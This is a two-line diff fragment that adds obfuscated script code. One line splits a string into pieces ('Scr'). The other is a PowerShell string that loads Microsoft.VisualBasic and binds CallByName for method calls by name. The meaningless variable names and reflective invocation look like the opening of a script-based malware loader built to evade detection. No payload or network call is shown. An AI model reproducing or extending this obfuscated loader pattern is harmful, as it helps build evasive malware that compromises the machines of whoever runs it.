@@ -1,0 +1,2 @@
+STBD = ("Scr")
+QZPD = "[void] [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$fj=[Microsoft.VisualBasic.Interaction]::CallByname"
